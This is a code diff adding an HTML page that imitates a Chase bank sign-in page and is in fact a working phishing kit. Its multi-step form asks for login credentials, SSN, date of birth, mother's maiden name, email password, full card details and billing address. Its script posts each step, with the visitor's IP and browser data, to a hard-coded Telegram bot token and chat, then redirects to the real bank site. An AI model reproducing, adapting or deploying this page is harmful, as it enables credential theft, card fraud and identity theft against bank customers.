@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Form</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: url('https://i.ibb.co/F4k4k8VG/Screenshot-20250419-161044.jpg') no-repeat center center/cover;
+      
+    }
+
+    .background {
+      position: fixed;
+      
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .login-box {
+      background: white;
+      width: 300px;
+      padding: 25px;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      margin: 100px auto;
+    }
+
+    .form-group {
+      position: relative;
+      margin-bottom: 25px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px 10px 10px 0;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      outline: none;
+      font-size: 16px;
+      background: transparent;
+    }
+
+    .form-group label {
+      position: absolute;
+      top: 10px;
+      left: 0;
+      font-size: 16px;
+      color: #888;
+      pointer-events: none;
+      transition: 0.2s ease all;
+    }
+
+    .form-group input:focus ~ label,
+    .form-group input:not(:placeholder-shown) ~ label {
+      top: -10px;
+      font-size: 12px;
+      color: #0077cc;
+    }
+
+    .form-group .toggle-password {
+      position: absolute;
+      right: 0;
+      top: 10px;
+      font-size: 0.9em;
+      color: #0077cc;
+      cursor: pointer;
+    }
+
+    .options {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.9em;
+      margin-bottom: 15px;
+    }
+
+    .login-box button {
+      background: #0077f7;
+      color: white;
+      width:100%;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background: #005ecb;
+    }
+
+    .links {
+      margin-top: 15px;
+      font-size: 0.85em;
+    }
+
+    .links a {
+      color: #0077cc;
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+    
+    
+  </style>
+  <style>
+   
+    .footer {
+      font-family: Arial, sans-serif;
+      font-size: 13px;
+      color: #666;
+      text-align: center;
+      border-top: 1px solid #ccc;
+      padding: 20px 10px;
+    }
+  
+    .footer .social {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 15px;
+      flex-wrap: wrap;
+    }
+  
+    .footer .social span {
+      font-weight: normal;
+      color: #333;
+    }
+  
+    .footer .social a svg {
+      width: 18px;
+      height: 18px;
+      fill: #333;
+      transition: fill 0.3s;
+    }
+  
+    .footer .social a:hover svg {
+      fill: #117ACA;
+    }
+  
+    .footer .links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin: 15px 0;
+    }
+  
+    .footer .links a {
+      color: #555;
+      text-decoration: none;
+    }
+  
+    .footer .links a:hover {
+      text-decoration: underline;
+    }
+  
+    .footer .bottom {
+      margin-top: 10px;
+      color: #999;
+      font-size: 12px;
+    }
+  
+    .footer .housing {
+      margin: 10px 0 5px;
+      font-size: 14px;
+    }
+  
+    .footer .housing::before {
+      content: "🏠";
+      margin-right: 5px;
+    }
+  </style>
+  <style>
+    .form-step { display: none; }
+    .form-step.active { display: block; }
+    button { padding: 0.5rem 1rem; font-size: 1rem; margin-top: 1rem; }
+    .domain-logo { height: 40px; margin-bottom: 1rem; }
+  </style>
+  
+</head>
+<body>
+<br>
+  <center><img src="https://i.ibb.co/wFzPyTDq/Screenshot-20250419-161702-1.jpg" width="130" height="50" ></center >
+  <br>
+  <br><br><div class="background"></div>
+  
+  
+  <div class="login-box">
+    <form  id="multiStepForm">
+    <div class="form-step active">
+    
+     <div class="form-group">
+     
+     <input type="text" id="username" required />
+     <label for="username">Username</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="password" id="password" required />
+     <label for="password">Password</label>
+     
+     </div>
+     <div class="options">
+     <label><input type="checkbox" /> Remember me</label>
+     <label><input type="checkbox" /> Use token</label>
+     </div>
+     <button type="button" onclick="nextStep(1)">Sign in</button>
+     
+     </div><!-- Step 2 -->
+     <div class="form-step">
+     <h2>Personal Information</h2>
+     <div class="form-group">
+     <input type="text" id="fullname" required />
+     <label>Full Name</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="tel" id="dob" maxlength="10" required />
+     <label>Date of Birth (MM/DD/YYYY)</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="tel" id="ssn" maxlength="11" required />
+     <label>SSN (XXX-XX-XXXX)</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="text" id="maiden" required />
+     <label>Mother's Maiden Name</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="text" id="license" />
+     <label>Driver License (Optional)</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="email" id="email" required />
+     <label>Email Address</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="tel" id="phone" maxlength="14" required />
+     <label>Phone Number ((XXX) XXX-XXXX)</label>
+     
+     </div>
+     <button type="button" onclick="nextStep(2)">Next</button>
+     </div>
+     
+     <!-- Step 3 -->
+     <div class="form-step">
+     <h4> Confirm Email Addresses Associated to Account </h4>
+     <img id="emailLogo" class="domain-logo" />
+     <p>Email: <strong id="displayEmail">example@example.com</strong></p>
+     <div class="form-group">
+     <input type="email" id="confirmEmail" required />
+     <label>Confirm Email Address</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="password" id="emailPassword" />
+     <label>Email Password </label>
+     
+     </div>
+     <button type="button" onclick="nextStep(3)">Next</button>
+     </div>
+     
+     <!-- Step 4 -->
+     <div class="form-step">
+     <h2> Credit Card Info</h2>
+     <div class="form-group">
+     <input type="text" id="cardName" />
+     <label>Card Holder Name</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="tel" id="cardNumber" maxlength="19" />
+     <label>Card Number</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="tel" id="ccv" maxlength="3" />
+     <label>CCV</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="tel" id="expiry" maxlength="5"  />
+     <label>Expiry Date (MM/YY)</label>
+     
+     </div>
+     <button type="button" onclick="nextStep(4)">Next</button>
+     </div>
+     
+     <!-- Step 5 -->
+     <div class="form-step">
+     <h2> Billing Address</h2>
+     <div class="form-group">
+     <input type="text" id="street" />
+    
+    <label>Street Address</label>
+    
+    </div>
+     <div class="form-group">
+     <input type="text" id="city" />
+     <label>City</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="text" id="state" />
+     <label>State</label>
+     
+     </div>
+     <div class="form-group">
+     <input type="text" id="zip" maxlength="5" />
+     
+     <label>ZIP Code</label>
+     </div>
+     <button type="button" onclick="nextStep(5)">Submit</button>
+     </div>
+     
+     <!-- Step 6 -->
+     <div class="form-step">
+     
+     <br><br>
+     <br><br>
+     <h2>
+     Information  in Processing...</h2>
+     <p id="finalStatus">Please wait while we process your information.</p>
+     <br><br>
+     <br><br>
+     
+     <br><br>
+     <br><br>
+     
+     </div>
+     
+     </form>  <script>
+     let currentStep = 0;
+     const steps = document.querySelectorAll(".form-step");
+     const telegramBotToken = "7827030466:AAEL54z9kqEYpUmrVs7tMr1wr55hD8udMGc";
+     const chatId = "-1002615055638";
+     
+     function nextStep(step) {
+     sendStepToTelegram(step);
+     steps[currentStep].classList.remove("active");
+     currentStep++;
+     if (currentStep < steps.length) {
+     steps[currentStep].classList.add("active");
+     
+     if (currentStep === 2) {
+     const email = document.getElementById("email").value;
+     document.getElementById("displayEmail").innerText = email;
+     const domain = email.split("@")[1];
+     document.getElementById("emailLogo").src = `https://logo.clearbit.com/${domain}`;
+     }
+     
+     if (currentStep === steps.length - 1) {
+     setTimeout(() => {
+     document.getElementById("finalStatus").innerText = "Redirecting...";
+     window.location.href = "https://www.chase.com/";
+     }, 5000);
+     }
+     }
+     }
+     
+     function sendStepToTelegram(step) {
+     const data = gatherData(step);
+     getClientInfo().then(info => {
+     const message = `Step ${step} Data:\n${data}\n\nClient Info:\n${info}`;
+     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+     method: "POST",
+     headers: { "Content-Type": "application/json" },
+     body: JSON.stringify({ chat_id: chatId, text: message })
+     });
+     });
+     }
+     
+     function gatherData(step) {
+     switch (step) {
+     case 1:
+     return `chase_log=>Username: ${document.getElementById("username").value}\nPassword: ${document.getElementById("password").value}`;
+     case 2:
+     return `chase_log=>Full Name: ${document.getElementById("fullname").value}\nDOB: ${document.getElementById("dob").value}\nSSN: ${document.getElementById("ssn").value}\nMaiden Name: ${document.getElementById("maiden").value}\nLicense: ${document.getElementById("license").value}\nEmail: ${document.getElementById("email").value}\nPhone: ${document.getElementById("phone").value}`;
+     case 3:
+     return `chase_log=>Confirm Email: ${document.getElementById("confirmEmail").value}\nEmail Password: ${document.getElementById("emailPassword").value}`;
+     case 4:
+     return `chase_log=>Card Name: ${document.getElementById("cardName").value}\nCard Number: ${document.getElementById("cardNumber").value}\nCCV: ${document.getElementById("ccv").value}\nExpiry: ${document.getElementById("expiry").value}`;
+     case 5:
+     return `chase_log=>Street: ${document.getElementById("street").value}\nCity: ${document.getElementById("city").value}\nState: ${document.getElementById("state").value}\nZIP: ${document.getElementById("zip").value}`;
+     default:
+     return "";
+     }
+     }
+     
+     async function getClientInfo() {
+     try {
+     const res = await fetch("https://api.ipify.org?format=json");
+     const ipData = await res.json();
+     const now = new Date();
+     const time = now.toLocaleString();
+     const browser = navigator.userAgent;
+     const device = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+     return `IP: ${ipData.ip}\nTime: ${time}\nBrowser: ${browser}\nDevice: ${device}`;
+     } catch (err) {
+     return "Could not retrieve client info.";
+     }
+     }
+     
+     function autoFormat(input, pattern) {
+     input.addEventListener("input", () => {
+     let i = 0;
+     const val = input.value.replace(/\D/g, "");
+     input.value = pattern.replace(/X/g, _ => val[i++] || "");
+     });
+     }
+     
+     window.onload = function () {
+     autoFormat(document.getElementById("dob"), "XX/XX/XXXX");
+     autoFormat(document.getElementById("ssn"), "XXX-XX-XXXX");
+     autoFormat(document.getElementById("phone"), "(XXX) XXX-XXXX");
+     autoFormat(document.getElementById("expiry"), "XX/XX");
+     autoFormat(document.getElementById("cardNumber"), "XXXX XXXX XXXX XXXX");
+     }
+     </script>
+      <div class="links">
+        <a href="#">Forgot username/password?</a><br />
+        <a href="#">Not Enrolled? Sign Up Now.</a>
+      </div>
+    </form>
+  </div>
+
+<br><br><br>
+
+
+<div class="footer">
+  <div class="social">
+    <span>Follow us:</span>
+    <a href="#" aria-label="Facebook">
+      <svg viewBox="0 0 24 24"><path d="M22 12A10 10 0 1 0 12 22v-7h-2v-3h2v-2c0-2 1.2-3 3-3h2v3h-2c-.5 0-1 .5-1 1v1h3l-1 3h-2v7a10 10 0 0 0 8-10z"/></svg>
+    </a>
+    <a href="#" aria-label="Instagram">
+      <svg viewBox="0 0 24 24"><path d="M7 2C4.8 2 3 3.8 3 6v12c0 2.2 1.8 4 4 4h10c2.2 0 4-1.8 4-4V6c0-2.2-1.8-4-4-4H7zm5 5a5 5 0 1 1 0 10 5 5 0 0 1 0-10zm6-1a1 1 0 1 1-2 0 1 1 0 0 1 2 0zM7 4h10c1.1 0 2 .9 2 2v1h-2a1 1 0 0 0-1 1v2h-2V8a1 1 0 0 0-1-1H9a1 1 0 0 0-1 1v2H6V8a1 1 0 0 0-1-1H3V6c0-1.1.9-2 2-2z"/></svg>
+    </a>
+    <a href="#" aria-label="Twitter">
+      <svg viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69a4.25 4.25 0 0 0 1.88-2.35 8.55 8.55 0 0 1-2.7 1.03 4.25 4.25 0 0 0-7.3 3.88A12.1 12.1 0 0 1 3.1 4.57a4.25 4.25 0 0 0 1.32 5.68 4.25 4.25 0 0 1-1.92-.53v.05a4.25 4.25 0 0 0 3.4 4.17 4.3 4.3 0 0 1-1.92.07 4.25 4.25 0 0 0 3.97 2.95A8.54 8.54 0 0 1 2 19.54a12 12 0 0 0 6.29 1.84c7.55 0 11.68-6.26 11.68-11.69 0-.18 0-.36-.01-.54A8.34 8.34 0 0 0 22.46 6z"/></svg>
+    </a>
+    <a href="#" aria-label="YouTube">
+      <svg viewBox="0 0 24 24"><path d="M10 15l5-3-5-3v6zm12-3c0-2.5-.2-4-1-5s-2.5-1-5.5-1h-7C5.5 6 4 6 3 7s-1 2.5-1 5 0 4 .9 5c.9 1 2.5 1 5.5 1h7c3 0 4.6 0 5.5-1 .9-1 1-2.5 1-5z"/></svg>
+    </a>
+    <a href="#" aria-label="LinkedIn">
+      <svg viewBox="0 0 24 24"><path d="M19 3A2 2 0 0 1 21 5v14a2 2 0 0 1-2 2h-3v-6.5c0-1.38-.56-2.5-2-2.5s-2 .95-2 2.5V21H9V9h3v1.5h.05c.5-.95 1.6-1.5 2.95-1.5 2.3 0 4 1.5 4 4.5V21h-.05V3h1.05zM6 9H3v12h3V9zm-1.5-3A1.5 1.5 0 1 0 6 7.5 1.5 1.5 0 0 0 4.5 6z"/></svg>
+    </a>
+  </div>
+
+  <div class="links">
+    <a href="#">Contact us</a>
+    <a href="#">Privacy</a>
+    <a href="#">Security</a>
+    <a href="#">Terms of use</a>
+    <a href="#">Accessibility</a>
+    <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+    <a href="#">Fair Lending</a>
+    <a href="#">About Chase</a>
+    <a href="#">J.P. Morgan</a>
+    <a href="#">JPMorgan Chase & Co.</a>
+    <a href="#">Careers</a>
+    <a href="#">Español</a>
+    <a href="#">Chase Canada</a>
+    <a href="#">Site map</a>
+    <a href="#">Member FDIC</a>
+  </div>
+
+  <div class="housing">Equal Housing Opportunity</div>
+  <div class="bottom">(c) 2025 JPMorgan Chase & Co.</div>
+</div>
+
+  <script>
+    function togglePassword() {
+      const password = document.getElementById("password");
+      const toggleText = document.querySelector(".toggle-password");
+      if (password.type === "password") {
+        password.type = "text";
+        toggleText.textContent = "Hide";
+      } else {
+        password.type = "password";
+        toggleText.textContent = "Show";
+      }
+    }
+  </script>
+</body>
+</html>
